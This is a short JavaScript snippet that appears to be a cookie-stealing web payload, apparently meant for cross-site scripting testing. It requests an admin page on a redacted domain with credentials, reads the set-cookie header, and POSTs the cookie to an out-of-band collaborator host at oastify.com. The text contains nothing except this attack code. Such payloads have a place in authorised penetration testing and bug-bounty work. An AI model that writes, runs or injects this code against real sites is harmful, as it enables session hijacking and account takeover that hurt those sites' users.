fetch("https://redacted.com/Admin", { credentials: "include" })  
  .then(res => res.headers.get("set-cookie"))  
  .then(cookie => cookie && fetch("https://t2wullzhu23gc2v4c7z8hn2ocfi66ywml.oastify.com", {  
    method: "POST",  
    headers: { "Content-Type": "application/x-www-form-urlencoded" },  
    body: "cookie=" + encodeURIComponent(cookie)  
  }));
